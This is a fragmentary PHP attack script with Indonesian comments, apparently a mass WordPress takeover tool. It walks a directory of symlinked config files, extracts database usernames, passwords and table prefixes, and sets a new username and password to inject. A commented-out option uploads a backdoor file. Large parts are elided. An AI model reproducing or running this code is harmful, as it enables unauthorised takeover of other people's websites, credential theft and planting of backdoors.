...
*/
error_reporting(0);
$user_baru = "namauser";//username baru
$pass_baru = "namapass"; //password baru
#$backdoor  = "idx.php"; //path backdoor yg akan diupload || UPLOAD BACKDOOR AKTIFKAN DI LINE 69 DAN 89
...
$x = scandir($argv[1]);
foreach($x as $xx){
	$file = file_get_contents($argv[1]."/".$xx);
	...
	if ($user == NULL || $dbprefix == NULL){continue;}
	#echo "[*]$xx\n\tUser   : $user\n\tPass   : $pass\n\tDB     : $db\n\tPrefix : $dbprefix\n\n";
	print "[*] Config : $xx\n";
...
Usage : php wp.php /path/to/sym_config/
";
}
?>
